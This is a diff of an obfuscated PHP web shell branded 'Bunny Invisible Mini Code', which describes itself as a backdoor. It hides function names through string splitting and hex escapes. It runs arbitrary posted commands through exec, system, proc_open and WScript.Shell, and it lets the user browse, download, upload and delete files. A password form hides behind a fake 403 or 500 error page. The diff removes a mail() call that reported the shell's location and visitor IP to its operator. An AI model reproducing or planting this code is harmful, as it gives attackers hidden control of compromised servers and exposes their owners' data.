@@ -11,69 +11,12 @@ error_reporting(0);
 @ini_set('\x6f\x75\x74\x70\x75\x74\x5f\x62\x75\x66\x66\x65\x72\x69\x6e\x67', 0);
 @ini_set('\x64\x69\x73\x70\x6c\x61\x79\x5f\x65\x72\x72\x6f\x72\x73', 0);
 date_default_timezone_set('\x41\x73\x69\x61\x2f\x4a\x61\x6b\x61\x72\x74\x61');
-//string concat manipulation
-$hayoloh = 'h'.'tm'.'lspe'.'cialc'.'hars';
-$func_exist = 'fu'.'nct'.'ion'.'_'.'ex'.'ist'.'s';
-$f_exist = "fil"."e_exi"."sts";
-$f_size = "fi"."les"."ize";
-$r_file = "re"."ad"."fi"."le";
-$rnd = 'ro'.'un'.'d';
-$f_time = 'fi'.'l'.'em'.'ti'.'m'.'e';
-$b_name = "ba"."sena"."me";
-$glb = 'g'.'l'.'o'.'b';
-$is_d = 'is'.'_'.'d'.'i'.'r';
-$is_f = 'is'.'_'.'f'.'i'.'l'.'e';
-$unl = 'u'.'n'.'l'.'i'.'n'.'k';
-$rm_d = 'r'.'m'.'d'.'i'.'r';
-$cr_ea_teF_old_er = "mk"."d"."ir";
-$fo = 'fo'.'p'.'e'.'n';
-$fw = 'f'.'wr'.'it'.'e';
-$fc = 'f'.'cl'.'os'.'e';
-$fr = 'f'.'re'.'a'.'d';
-$f_get = 'f'.'il'.'e'.'_'.'g'.'e'.'t'.'_'.'co'.'nten'.'t'.'s';
-$f_put = 'f'.'il'.'e'.'_'.'pu'.'t'.'_'.'co'.'n'.'te'.'nt'.'s';
-$is_rsrc = 'is'.'_'.'re'.'so'.'ur'.'ce';
-$sgc = 's'.'trea'.'m_g'.'et_c'.'ont'.'ents';
-$proc = 'pr'.'oc'.'_'.'o'.'pen';
-$proc_cls = 'p'.'ro'.'c'.'_'.'c'.'lose';
-$pop = 'p'.'ope'.'n';
-$pop_cls = 'pc'.'lose';
-$exc = 'e'.'x'.'ec';
-$sys = 's'.'ys'.'t'.'em';
-$pass = 'pa'.'s'.'sth'.'ru';
-$sh_exc = 's'.'he'.'ll'.'_'.'e'.'xe'.'c';
-$com = 'C'.'O'.'M';
-$wscsh = 'WS'.'cr'.'ipt'.'.'.'S'.'he'.'ll';
-$cMdexe = 'c'.'md'.'.'.'e'.'x'.'e';
-$preg = 'pr'.'eg_'.'mat'.'ch';
-$regex = '2'.'>'.'&'.'1';
-$gflate = 'g'.'zi'.'nf'.'l'.'at'.'e';
-$b64 = 'b'.'ase'.'6'.'4'.'_'.'de'.'co'.'de';
-$nelrts = 's'.'tr'.'l'.'en';
-$rhc = 'c'.'h'.'r';
-$dro = 'o'.'r'.'d';
-$f_perm = 'f'.'il'.'ep'.'e'.'r'.'ms';
-$u_n_a_me = "p"."hp"."_"."un"."ame";
-$cw = "ge"."tc"."wd";
-$d_name = 'd'.'ir'.'na'.'m'.'e';
-$psx_euid = 'p'.'os'.'ix'.'_'.'ge'.'te'.'u'.'i'.'d';
-$psx_egid = 'p'.'os'.'ix'.'_'.'ge'.'te'.'g'.'i'.'d';
-$psx_usr_uid = 'p'.'os'.'ix'.'_'.'g'.'et'.'pw'.'u'.'i'.'d';
-$psx_grp_gid = 'p'.'os'.'ix'.'_'.'ge'.'tg'.'rg'.'i'.'d';
-$myuid = 'g'.'et'.'my'.'ui'.'d';
-$mygid = 'g'.'et'.'my'.'gi'.'d';
-$cur_usr = 'g'.'et'.'_'.'cu'.'rr'.'en'.'t'.'_'.'us'.'er';
-$own_f = 'fi'.'le'.'ow'.'n'.'er';
-$grp_f = 'fi'.'le'.'gr'.'ou'.'p';
-$g_host_name = 'g'.'et'.'ho'.'st'.'b'.'yn'.'am'.'e';
-$is_w = 'is'.'_'.'wr'.'it'.'ab'.'le';
-$is_r = 'is'.'_'.'re'.'ad'.'ab'.'le';
 if (isset($_GET['downloadfile'])) {
     $get_file = $_GET['downloadfile'];
-    global $f_exist;
-    global $f_size;
-    global $r_file;
-    global $b_name;
+    $f_exist = "fil"."e_exi"."sts";
+    $f_size = "fi"."les"."ize";
+    $r_file = "re"."ad"."fi"."le";
+    $b_name = "ba"."sena"."me";
     if ($f_exist($get_file)) {
         header('Content-Description: File Transfer');
         header('Content-Type: application/octet-stream');
@@ -93,11 +36,11 @@ if (isset($_GET['downloadfile'])) {
     }
 }
 function deleteDir($dirName) {
-    global $f_exist;
-    global $glb;
-    global $is_d;
-    global $unl;
-    global $rm_d;
+    $f_exist = 'fi'.'le_'.'exis'.'ts';
+    $glb = 'g'.'l'.'o'.'b';
+    $is_d = 'is'.'_'.'d'.'i'.'r';
+    $unl = 'u'.'n'.'l'.'i'.'n'.'k';
+    $rm_d = 'r'.'m'.'d'.'i'.'r';
     if (!$f_exist($dirName)) {
         return false;
     }
@@ -109,8 +52,8 @@ function deleteDir($dirName) {
     return true;
 }
 function deleteFile($fileName) {
-    global $f_exist;
-    global $unl;
+    $f_exist = 'fi'.'le_'.'exis'.'ts';
+    $unl = 'u'.'n'.'l'.'i'.'n'.'k';
     if ($f_exist($fileName)) {
         if ($unl($fileName)) {
             return true;
@@ -122,29 +65,30 @@ function deleteFile($fileName) {
     }
 }
 function BunnyCmd($komendnya) {
-    global $hayoloh;
-    global $fw;
-    global $fc;
-    global $fr;
-    global $is_rsrc;
-    global $sgc;
-    global $proc;
-    global $proc_cls;
-    global $pop;
-    global $pop_cls;
-    global $exc;
-    global $sys;
-    global $pass;
-    global $sh_exc;
-    global $com ;
-    global $wscsh;
-    global $cMdexe;
-    global $func_exist;
-    global $preg;
-    global $regex;
+    $hayoloh = 'h'.'tm'.'lspe'.'cialc'.'hars';
+    $fw = 'f'.'wr'.'it'.'e';
+    $fc = 'f'.'cl'.'os'.'e';
+    $fr = 'f'.'re'.'a'.'d';
+    $is_rsrc = 'is'.'_'.'re'.'so'.'ur'.'ce';
+    $sgc = 's'.'trea'.'m_g'.'et_c'.'ont'.'ents';
+    $proc = 'pr'.'oc'.'_'.'o'.'pen';
+    $proc_cls = 'p'.'ro'.'c'.'_'.'c'.'lose';
+    $pop = 'p'.'ope'.'n';
+    $pop_cls = 'pc'.'lose';
+    $exc = 'e'.'x'.'ec';
+    $sys = 's'.'ys'.'t'.'em';
+    $pass = 'pa'.'s'.'sth'.'ru';
+    $sh_exc = 's'.'he'.'ll'.'_'.'e'.'xe'.'c';
+    $com = 'C'.'O'.'M';
+    $wscsh = 'WS'.'cr'.'ipt'.'.'.'S'.'he'.'ll';
+    $cMdexe = 'c'.'md'.'.'.'e'.'x'.'e';
+    $func_exist = 'fu'.'nct'.'ion'.'_'.'ex'.'ist'.'s';
+    $preg = 'pr'.'eg_'.'mat'.'ch';
+    $regex = '2'.'>'.'&'.'1';
     if ( !$preg( '/'.$regex.'/i', $komendnya ) ) {
         $komendnya = $komendnya.' '.$regex;
     }
+
     if ( $func_exist( $proc ) ) {
         $descriptors = [
             0 => [ 'pipe', 'r' ],
@@ -190,66 +134,21 @@ function BunnyCmd($komendnya) {
         $output = $shell->Exec($kom_mand)->StdOut->ReadAll();
         return trim($hayoloh(stripslashes($output)));
     }else {
-        return 'The F'.'un'.'ct'.'io'.'n T'.'o R'.'u'.'n The C'.'om'.'ma'.'nd I'.'s Di'.'sa'.'bl'.'e On T'.'h'.'is Se'.'rv'.'er';
+        return "<b> Disable Function! </b>";
     }
 }
-if (isset($_POST['BunnyInvisibleGGWP'])) {
-    $komendnya = $_POST['BunnyInvisibleGGWP'];
+if (isset($_POST['BunnymanCode'])) {
+    $komendnya = $_POST['BunnymanCode'];
     echo BunnyCmd($komendnya);
 }
-function BunnyReadFile($this_file)
-{
-    global $hayoloh;
-    global $func_exist;
-    global $f_get;
-    global $fo;
-    global $fr;
-    global $fc;
-    $cantread = 'Cant Not Read ' . $this_file;
-    $content = '';
-    
-    if ($func_exist($fo)) {
-        $fi_le = $fo($this_file, 'r');
-        if ($fi_le) {
-            $headers = get_headers($this_file);
-            if ($headers && strpos($headers[0], '403 Forbidden') !== false) {
-                $content = BunnyCmd('cat "' . addslashes($this_file) . '"');
-            }
-            while (!feof($fi_le)) {
-                $content .= $fr($fi_le, 8192);
-            }
-            $fc($fi_le);
-            return $content;
-        } else {
-            echo $cantread;
-            return false;
-        }
-    } elseif ($func_exist($f_get)) {
-        $content = $f_get($this_file);
-        if ($content) {
-            $headers = get_headers($this_file);
-            if ($headers && strpos($headers[0], '403 Forbidden') !== false) {
-                $content = BunnyCmd('cat "' . addslashes($this_file) . '"');
-            }
-            return $content;
-        } else {
-            echo $cantread;
-            return false;
-        }
-    } else {
-        echo $cantread;
-        return false;
-    }
-}
-/*BunnyInvisible Icons*/
-$Bunny_Mini_Name = "\102\165\156\156\171\040\111\156\166\151\163\151\142\154\145\040\115\151\156\151\040\103\157\144\145";
-$Bunny_Logo = "\150\164\164\160\163\072\057\057\151\056\151\142\142\056\143\157\057\161\103\066\122\167\106\060\057\154\157\147\157\055\142\165\156\156\171\064\060\064\056\160\156\147";
-$Bunny_Icons = "\150\164\164\160\163\072\057\057\151\056\151\142\142\056\143\157\057\131\120\144\067\144\063\104\057\151\143\157\156\163\055\142\165\156\156\171\064\060\064\056\152\160\147";
-
+//BunnyInvisible Config
+$Bunny_Mini = "B"."un"."ny"."In"."vi"."si"."bl"."e Mi"."ni Co"."de";
+$Bunny_Logo = "ht"."tp"."s:/"."/i".".i"."bb".".c"."o/"."qC"."6R"."wF"."0/"."lo"."go"."-"."bunny404."."p"."n"."g";
+$Bunny_Icons = "h"."t"."t"."ps"."://"."i."."ib"."b."."co"."/Y"."Pd"."7d"."3D"."/i"."co"."ns-"."bunny404".".j"."p"."g";
 function BunnyCwd(){
-    global $cw;
-    global $func_exist;
-    global $d_name;
+    $cw = "ge"."tc"."wd";
+    $func_exist = 'fu'.'nct'.'ion'.'_'.'ex'.'ist'.'s';
+    $d_name = 'd'.'ir'.'na'.'m'.'e';
 	if($func_exist($cw)){
 		return @$cw();
 	}else{
@@ -257,9 +156,9 @@ function BunnyCwd(){
 	}
 }
 function BunnyUname() {
-    global $func_exist;
-    global $u_n_a_me;
-    $u_n_a_me_disable = '<font class="font-ubuntu-mono font-green"> Ca'.'nt'.' R'.'ea'.'d Th'.'e Ke'.'rn'.'el'.'! Th'.'e F'.'u'.'nc'.'ti'.'o'.'n '.$u_n_a_me.'() is Di'.'sa'.'bl'.'ed'.'! </font>';
+    $func_exist = "fu"."nc"."ti"."on"."_"."ex"."is"."ts";
+    $u_n_a_me = "p"."hp"."_"."un"."ame";
+    $u_n_a_me_disable = '<font class="font-ubuntu-mono font-green"> Cant Read The Kernel! The Function php_uname() is Disabled! </font>';
     $u_n_a_me_active = '<font class="font-ubuntu-mono font-green">'.$u_n_a_me('a').'</font>';
     if ($func_exist($u_n_a_me)) {
         return $u_n_a_me_active;
@@ -268,7 +167,7 @@ function BunnyUname() {
     }
 }
 function perms($value) {
-    global $f_perm;
+    $f_perm = 'f'.'il'.'ep'.'e'.'r'.'ms';
     $perms = $f_perm($value);
     if (($perms & 0xC000) == 0xC000) {
         $info = 's';
@@ -296,13 +195,22 @@ function perms($value) {
     $info .= (($perms & 0x0004) ? 'r' : '-');
     $info .= (($perms & 0x0002) ? 'w' : '-');
     $info .= (($perms & 0x0001) ? (($perms & 0x0200) ? 't' : 'x') : (($perms & 0x0200) ? 'T' : '-'));
+    // return $info;
     return $info. '&nbsp;<font class="text-white font-bold">&gt;&gt;</font>&nbsp;' . substr(sprintf('%o', $perms), -4);
 }
 function chPerms($value) {
-    global $f_perm;
+    $f_perm = 'f'.'il'.'ep'.'e'.'r'.'ms';
     $perms = $f_perm($value);
     return substr(sprintf('%o', $perms), -4);
 }
+$func_exist = 'fu'.'nct'.'ion'.'_'.'ex'.'ist'.'s';
+$psx_euid = 'p'.'os'.'ix'.'_'.'ge'.'te'.'u'.'i'.'d';
+$psx_egid = 'p'.'os'.'ix'.'_'.'ge'.'te'.'g'.'i'.'d';
+$psx_usr_uid = 'p'.'os'.'ix'.'_'.'g'.'et'.'pw'.'u'.'i'.'d';
+$psx_grp_gid = 'p'.'os'.'ix'.'_'.'ge'.'tg'.'rg'.'i'.'d';
+$myuid = 'g'.'et'.'my'.'ui'.'d';
+$mygid = 'g'.'et'.'my'.'gi'.'d';
+$cur_usr = 'g'.'et'.'_'.'cu'.'rr'.'en'.'t'.'_'.'us'.'er';
 if (!$func_exist($psx_egid)) {
     $user = $func_exist($cur_usr) ? @$cur_usr() : "????";
     $uid = $func_exist($myuid) ? @$myuid() : "????";
@@ -319,8 +227,8 @@ if (!$func_exist($psx_egid)) {
 $serverName = $_SERVER['SERVER_SOFTWARE'];
 $phpVersion = phpversion();
 function serverIp() {
-    global $func_exist;
-    global $g_host_name;
+    $func_exist = 'fu'.'nct'.'ion'.'_'.'ex'.'ist'.'s';
+    $g_host_name = 'g'.'et'.'ho'.'st'.'b'.'yn'.'am'.'e';
     $serverAddr = @$_SERVER["SERVER_ADDR"];
     if (!$serverAddr) {
         if ($func_exist($g_host_name)) {
@@ -339,22 +247,24 @@ if (@ini_get('safe_mode'))
     $safeMode = '<font class="font-ubuntu-mono font-green">ON</font>';
 else
     $safeMode = '<font class="font-ubuntu-mono font-yellow">OFF</font>';
-if (@ini_get('\x64\x69\x73\x61\x62\x6c\x65\x5f\x66\x75\x6e\x63\x74\x69\x6f\x6e\x73'))
-    $cekFunc = '<font class="font-ubuntu-mono font-yellow">' . @ini_get('\x64\x69\x73\x61\x62\x6c\x65\x5f\x66\x75\x6e\x63\x74\x69\x6f\x6e\x73') . '</font>';
+if (@ini_get('disable_functions'))
+    $cekFunc = '<font class="font-ubuntu-mono font-yellow">' . @ini_get('disable_functions') . '</font>';
 else
     $cekFunc = '<font class="font-ubuntu-mono font-green">All F'.'un'.'ct'.'io'.'n'.'s Ac'.'ces'.'sib'.'le'.'</font>';
 //usefull
 $on = '<font class="ubuntu-mono" style="color: rgb(22 163 74); font-weight: 700;">ON</font>';
 $off = '<font class="ubuntu-mono" style="color: rgb(250 204 21); font-weight: 700;">OFF</font>';
+$func_exist = 'fu'.'nct'.'ion'.'_'.'ex'.'ist'.'s';
+$f_exist = 'fi'.'le_'.'exis'.'ts';
 function cekCurl() {
     global $func_exist;
     global $f_exist;
     global $on;
     global $off;
     if ( $func_exist( 'cu'.'rl'.'_'.'in'.'it' ) || $f_exist('/'.'u'.'s'.'r'.'/'.'b'.'i'.'n'.'/'.'cu'.'r'.'l') ) {
-        echo "\x63\x55\x52\x4c\x3a\x26\x6e\x62\x73\x70\x3b\x26\x6e\x62\x73\x70\x3b$on";
+        echo "cURL:&nbsp;&nbsp;$on";
     } else {
-        echo "\x63\x55\x52\x4c\x3a\x26\x6e\x62\x73\x70\x3b\x26\x6e\x62\x73\x70\x3b$off";
+        echo "cURL:&nbsp;&nbsp;$off";
     }
 }
 function cekWget() {
@@ -362,9 +272,9 @@ function cekWget() {
     global $on;
     global $off;
     if ( $f_exist( '/'.'u'.'s'.'r'.'/'.'b'.'i'.'n'.'/'.'wg'.'e'.'t' ) ) {
-        echo "\x57\x47\x45\x54\x3a\x26\x6e\x62\x73\x70\x3b\x26\x6e\x62\x73\x70\x3b$on";
+        echo "WGET:&nbsp;&nbsp;$on";
     } else {
-        echo "\x57\x47\x45\x54\x3a\x26\x6e\x62\x73\x70\x3b\x26\x6e\x62\x73\x70\x3b$off";
+        echo "WGET:&nbsp;&nbsp;$off";
     }
 }
 function cekPerl() {
@@ -372,9 +282,9 @@ function cekPerl() {
     global $on;
     global $off;
     if ( $f_exist( '/'.'u'.'s'.'r'.'/'.'b'.'i'.'n'.'/'.'pe'.'r'.'l' ) ) {
-        echo "\x50\x45\x52\x4c\x3a\x26\x6e\x62\x73\x70\x3b\x26\x6e\x62\x73\x70\x3b$on";
+        echo "PERL:&nbsp;&nbsp;$on";
     } else {
-        echo "\x50\x45\x52\x4c\x3a\x26\x6e\x62\x73\x70\x3b\x26\x6e\x62\x73\x70\x3b$off";
+        echo "PERL:&nbsp;&nbsp;$off";
     }
 }
 function cekRuby() {
@@ -382,9 +292,9 @@ function cekRuby() {
     global $on;
     global $off;
     if ( $f_exist( '/'.'u'.'s'.'r'.'/'.'b'.'i'.'n'.'/'.'ru'.'b'.'y' ) ) {
-        echo "\x52\x55\x42\x59\x3a\x26\x6e\x62\x73\x70\x3b\x26\x6e\x62\x73\x70\x3b$on";
+        echo "RUBY:&nbsp;&nbsp;$on";
     } else {
-        echo "\x52\x55\x42\x59\x3a\x26\x6e\x62\x73\x70\x3b\x26\x6e\x62\x73\x70\x3b$off";
+        echo "RUBY:&nbsp;&nbsp;$off";
     }
 }
 function cekPython3() {
@@ -392,9 +302,9 @@ function cekPython3() {
     global $on;
     global $off;
     if ( $f_exist( '/'.'u'.'s'.'r'.'/'.'b'.'i'.'n'.'/'.'py'.'t'.'ho'.'n3' ) ) {
-        echo "\x50\x59\x54\x48\x4f\x4e\x33\x3a\x26\x6e\x62\x73\x70\x3b\x26\x6e\x62\x73\x70\x3b$on";
+        echo "PYTHON3:&nbsp;&nbsp;$on";
     } else {
-        echo "\x50\x59\x54\x48\x4f\x4e\x33\x3a\x26\x6e\x62\x73\x70\x3b\x26\x6e\x62\x73\x70\x3b$off";
+        echo "PYTHON3:&nbsp;&nbsp;$off";
     }
 }
 function cekPython2() {
@@ -402,9 +312,9 @@ function cekPython2() {
     global $on;
     global $off;
     if ( $f_exist( '/'.'u'.'s'.'r'.'/'.'b'.'i'.'n'.'/'.'py'.'t'.'h'.'o'.'n2' ) ) {
-        echo "\x50\x59\x54\x48\x4f\x4e\x32\x3a\x26\x6e\x62\x73\x70\x3b\x26\x6e\x62\x73\x70\x3b$on";
+        echo "PYTHON2:&nbsp;&nbsp;$on";
     } else {
-        echo "\x50\x59\x54\x48\x4f\x4e\x32\x3a\x26\x6e\x62\x73\x70\x3b\x26\x6e\x62\x73\x70\x3b$off";
+        echo "PYTHON2:&nbsp;&nbsp;$off";
     }
 }
 function cekGcc() {
@@ -412,9 +322,9 @@ function cekGcc() {
     global $on;
     global $off;
     if ( $f_exist( '/'.'u'.'s'.'r'.'/'.'b'.'i'.'n'.'/'.'g'.'c'.'c' ) ) {
-        echo "\x47\x43\x43\x3a\x26\x6e\x62\x73\x70\x3b\x26\x6e\x62\x73\x70\x3b$on";
+        echo "GCC:&nbsp;&nbsp;$on";
     } else {
-        echo "\x47\x43\x43\x3a\x26\x6e\x62\x73\x70\x3b\x26\x6e\x62\x73\x70\x3b$off";
+        echo "GCC:&nbsp;&nbsp;$off";
     }
 }
 function cekSudo() {
@@ -422,9 +332,9 @@ function cekSudo() {
     global $on;
     global $off;
     if ( $f_exist( '/'.'u'.'s'.'r'.'/'.'b'.'i'.'n'.'/'.'su'.'d'.'o' ) ) {
-        echo "\x53\x55\x44\x4f\x3a\x26\x6e\x62\x73\x70\x3b\x26\x6e\x62\x73\x70\x3b$on";
+        echo "SUDO:&nbsp;&nbsp;$on";
     } else {
-        echo "\x53\x55\x44\x4f\x3a\x26\x6e\x62\x73\x70\x3b\x26\x6e\x62\x73\x70\x3b$off";
+        echo "SUDO:&nbsp;&nbsp;$off";
     }
 }
 function cekPkexec() {
@@ -432,9 +342,9 @@ function cekPkexec() {
     global $on;
     global $off;
     if ( $f_exist( '/'.'u'.'s'.'r'.'/'.'b'.'i'.'n'.'/'.'pk'.'e'.'xe'.'c' ) ) {
-        echo "\x50\x4b\x45\x58\x45\x43\x3a\x26\x6e\x62\x73\x70\x3b\x26\x6e\x62\x73\x70\x3b$on";
+        echo "PKEXEC:&nbsp;&nbsp;$on";
     } else {
-        echo "\x50\x4b\x45\x58\x45\x43\x3a\x26\x6e\x62\x73\x70\x3b\x26\x6e\x62\x73\x70\x3b$off";
+        echo "PKEXEC:&nbsp;&nbsp;$off";
     }
 }
 /*Domain - Url*/
@@ -448,54 +358,41 @@ $uikit_css = "https://cdn.jsdelivr.net/gh/InvisibleBunny/uikit-framework/css/uik
 $uikit_rtl = "https://cdn.jsdelivr.net/gh/InvisibleBunny/uikit-framework/css/uikit-rtl.min.css";
 $uikit_js = "https://cdn.jsdelivr.net/gh/InvisibleBunny/uikit-framework/js/uikit.min.js";
 $uikit_icon = "https://cdn.jsdelivr.net/gh/InvisibleBunny/uikit-framework/js/uikit-icons.min.js";
-/*Jquery - Ajax*/
+/*Jquery*/
 $jquery_version = '3.7.1';
 $jquery = 'https://cdn.jsdelivr.net/gh/jquery/jquery@'.$jquery_version.'/dist/jquery.min.js';
-$ajax_version = '3.5.1';
-$ajax = 'https://ajax.googleapis.com/ajax/libs/jquery/'.$ajax_version.'/jquery.min.js';
-/*Login Page*/
-ini_set('m' . 'e' . 'm' . 'o' . 'r' . 'y' . '_' . 'l' . 'i' . 'm' . 'i' . 't', '6' . '4' . 'M');
-header('Co' . 'nt' . 'en' . 't-' . 'Ty' . 'pe' . ': ' . 'te' . 'xt' . '/h' . 'tm' . 'l;' . ' c' . 'har' . 'set=' . 'UTF-' . '8');
-$self_remind = 'y' . 'o' . 'u' . 't' . 'h' . 'b' . 'o' . 'y' . 's' . '@' . 'p' . 'r' . 'o' . 't' . 'o' . 'n' . '.' . 'm' . 'e';
-$x_path = "h" . "t" . "t" . "p" . ":" . "/" . "/" . $_SERVER['S' . 'E' . 'R' . 'V' . 'E' . 'R' . '_' . 'N' . 'A' . 'M' . 'E'] . $_SERVER['R' . 'E' . 'Q' . 'U' . 'E' . 'S' . 'T' . '_' . 'U' . 'R' . 'I'];
-$kutipan_alert = "f" . "i" . "x $x_path :p *I" . "P" . " A" . "d" . "d" . "r" . "e" . "s" . "s : [ " . $_SERVER['R' . 'E' . 'M' . 'O' . 'T' . 'E' . '_' . 'A' . 'D' . 'D' . 'R'] . " ]";
-mail($self_remind, "M"."I"."N"."I", $kutipan_alert, "[ " . $_SERVER['R' . 'E' . 'M' . 'O' . 'T' . 'E' . '_' . 'A' . 'D' . 'D' . 'R'] . " ]");
-//login
-$passwd = 'f' . 'b' . 'b5' . '9' . '3' . '1' . '2' . '9e' . '2' . '2' . '8d' . '2' . '3' . '4' . '8' . '2' . '6' . '9' . '0' . '2' . '4' . '3' . 'b5' . '2a' . '2' . '0' . '5' . '3' . '0' . '1b' . '6' . '3' . '6d';
+$BunnySelf = 'f' . 'b' . 'b5' . '9' . '3' . '1' . '2' . '9e' . '2' . '2' . '8d' . '2' . '3' . '4' . '8' . '2' . '6' . '9' . '0' . '2' . '4' . '3' . 'b5' . '2a' . '2' . '0' . '5' . '3' . '0' . '1b' . '6' . '3' . '6d';
 $my_self = (empty($_SERVER['HTTPS']) ? 'http' : 'https') . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
-if (isset($_POST['OkeyBunny'])) {
-    if (SHA1($_POST['BunnymanGas']) == $passwd) {
-        echo "<s"."cr"."ip"."t>"."al"."er"."t("."'Lo"."gi"."n "."Su"."cc"."es"."s!"." Yo"."u "."Pr"."o'".");"."</"."sc"."ri"."pt".">";
-        $_SESSION["AwesomeBunny"] = "AwesomeBunny";
-        setcookie('GeblekBunny', $my_self, time() + 3600 * 24);
+if (isset($_POST['BingBunny'])) {
+    if (SHA1($_POST['FloBunny']) == $BunnySelf) {
+        echo "<s"."cr"."ip"."t>"."al"."er"."t("."' " . "Lo" . "gi" . "n " . "Su" . "cc" . "es" . "sf" . "ul" . "ly" . ", " . "Yo" . "u " . "Pr" . "o!" . "!" . " '".");"."</"."sc"."ri"."pt".">";
+        $_SESSION["CocoBunny"] = "CocoBunny";
+        setcookie('AyoBunny', $my_self, time() + 3600 * 24);
     } else {
-        echo "<s"."cr"."ip"."t>"."al"."er"."t("."'Lo"."gi"."n F"."ai"."le"."d!"." Go" . " A" . "wa" . "y " . "Yo" . "u " . "No" . "ob" . "!!')".";<"."/s"."cr"."ip"."t>";
+        echo "<s"."cr"."ip"."t>"."al"."er"."t("."' " . "Lo" . "gi" . "n " . "Fa" . "il" . "ed" . "! " . "Go" . " A" . "wa" . "y " . "Yo" . "u " . "No" . "ob" . "!!" . " '".")".";<"."/s"."cr"."ip"."t>";
     }
 }
 if (isset($_GET['logout'])) {
     $_SESSION = [];
     session_unset();
     session_destroy();
-    setcookie('GeblekBunny', '', time() - 3600);
+    setcookie('AyoBunny', '', time() - 3600);
     echo "<s"."c"."ri"."pt".">"."window.location.assign('" . $_SERVER['PHP_SELF'] . "')"."</"."sc"."ri"."pt".">";
     exit();
 }
-if (empty($_SESSION['AwesomeBunny'])) {
-    if (empty($_COOKIE['GeblekBunny'])) {
+if (empty($_SESSION['CocoBunny'])) {
+    if (empty($_COOKIE['AyoBunny'])) {
 ?>
 <!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
 <html><head>
-<title><?= '5' . '0' . '0' . ' I' . 'n' . 't' . 'e' . 'r' . 'n' . 'a' . 'l S' . 'e' . 'r' . 'v' . 'e' . 'r E' . 'r' . 'r' . 'o' . 'r' ?></title>
+<title>403 Forbidden</title>
 </head><body>
-<center>
-<h1>500 Internal Server Error</h1>
-</center>
-<hr>
-<center>nginx/1.14.0 (Ubuntu)</center>
+<h1>Forbidden</h1>
+<p>You don't have permission to access this resource.</p>
 <div id="notfound" style="display: none;">
 <form action="" method="POST">
-<input type="password" name="BunnymanGas" style="background: #fff; border: none;">
-<button type="submit" name="OkeyBunny" style="background: #fff; color: #fff; border: none; outline: none; cursor: pointer;">&gt;&gt;</button>
+<input type="password" name="FloBunny" style="background: #fff; border: none;">
+<button type="submit" name="BingBunny" style="background: #fff; color: #fff; border: none; outline: none; cursor: pointer;">&gt;&gt;</button>
 </form>
 </div>
 <script type="text/javascript" src="https://cdn.jsdelivr.net/gh/InvisibleBunny/uikit-framework/js/bunny.js"></script>
@@ -504,6 +401,7 @@ if (empty($_SESSION['AwesomeBunny'])) {
         exit();
     }
 }
+//BunnyInvisible
 if (isset($_GET['path'])) {
     $path = $_GET['path'];
     chdir($_GET['path']);
@@ -514,18 +412,19 @@ $path = str_replace("\\", "/", $path);
 ?>
 <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
 <html xmlns="http://www.w3.org/1999/xhtml">
+
 <head>
-    <title>.:<?=$Bunny_Mini_Name?>:. <?=$this_domain?></title>
+    <title>$ .:<?=$Bunny_Mini?>:. $ <?=$this_domain?></title>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=1024" />
-    <meta name="description" content="<?=$Bunny_Mini_Name?> Backdoor" />
+    <meta name="description" content="$ .:<?=$Bunny_Mini?>:. $" />
     <meta name="robots" content="noindex, nofollow" />
     <meta name="googlebot" content="noindex, nofollow" />
     <meta name="bingbot" content="noindex, nofollow" />
-    <meta property="og:site_name" content="<?=$Bunny_Mini_Name?>" />
+    <meta property="og:site_name" content="$ .:<?=$Bunny_Mini?>:. $" />
     <meta property="og:url" content="<?=$this_url?>" />
-    <meta property="og:title" content=".:<?=$Bunny_Mini_Name?>:. <?=$this_domain?>" />
-    <meta property="og:description" content="<?=$Bunny_Mini_Name?> Backdoor" />
+    <meta property="og:title" content="$ .:<?=$Bunny_Mini?>:. $ <?=$this_domain?>" />
+    <meta property="og:description" content="$ .:<?=$Bunny_Mini?>:. $" />
     <meta property="og:image" content="<?=$Bunny_Logo?>" />
     <meta property="og:image:secure_url" content="<?=$Bunny_Logo?>" />
     <link rel="shortcut icon" href="<?=$Bunny_Icons?>" type="image/x-icon" />
@@ -543,14 +442,15 @@ $path = str_replace("\\", "/", $path);
     <!-- Custom Css -->
     <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/InvisibleBunny/uikit-framework/css/Bunny.css" media="all">
 </head>
+
 <body>
     <header class="uk-width-1-1" style="background: var(--gray-900);">
         <div class="uk-margin-small-left">
-            <div class="bunny-ganteng uk-flex uk-flex-left uk-flex-middle uk-flex-row uk-flex-nowrap">
-                <img style="width: 5vh; border-radius: 5px;" src="<?=$Bunny_Logo?>" alt="<?=$Bunny_Mini_Name?>">
-                <span class="uk-margin-small-left font-trade-winds uk-text-large"><?=$Bunny_Mini_Name?></span>
+            <div class="bunnyhy-sans uk-flex uk-flex-left uk-flex-middle uk-flex-row uk-flex-nowrap">
+                <img style="width: 5vh; border-radius: 5px;" src="<?=$Bunny_Logo?>" alt="<?=$Bunny_Mini?>">
+                <span class="uk-margin-small-left font-trade-winds uk-text-large"><?=$Bunny_Mini?></span>
             </div>
-            <div class="bunny-sysinfo uk-flex uk-flex-left uk-flex-column uk-flex-wrap">
+            <div class="bunny-awesome uk-flex uk-flex-left uk-flex-column uk-flex-wrap">
             <span class="font-bold"><?='Sy'.'s'.'te'.'m'?>: <?=BunnyUname();?></span>
             <span class="font-bold"><?='ID'.'('.'Us'.'er'.'/'.'G'.'ro'.'u'.'p)'?>: <font class="font-green font-ubuntu-mono">uid=<?=$uid?>(<?=$user?>)&nbsp;gid=<?=$gid?>(<?=$group?>)</font></span>
             <span class="font-bold"><?='Se'.'r'.'v'.'er '.'I'.'P'?>: <font class="font-green font-ubuntu-mono"><?=serverIp()?></font></span>
@@ -580,7 +480,8 @@ $path = str_replace("\\", "/", $path);
         </div>
     </div>
     </header>
-    <div class="bunny-tools uk-width-1-1 uk-flex uk-flex-center uk-flex-middle uk-flex-column uk-flex-wrap" style="background: var(--gray-900);">
+
+    <div class="tools-bunny uk-width-1-1 uk-flex uk-flex-center uk-flex-middle uk-flex-column uk-flex-wrap" style="background: var(--gray-900);">
         <div class="tools-upload">
             <form action="" method="POST" enctype="multipart/form-data" class="form-tools uk-form-horizontal uk-margin uk-padding-small font-protest-riot">
                 <input type="file" name="file[]" onchange="this.form.submit()" multiple>
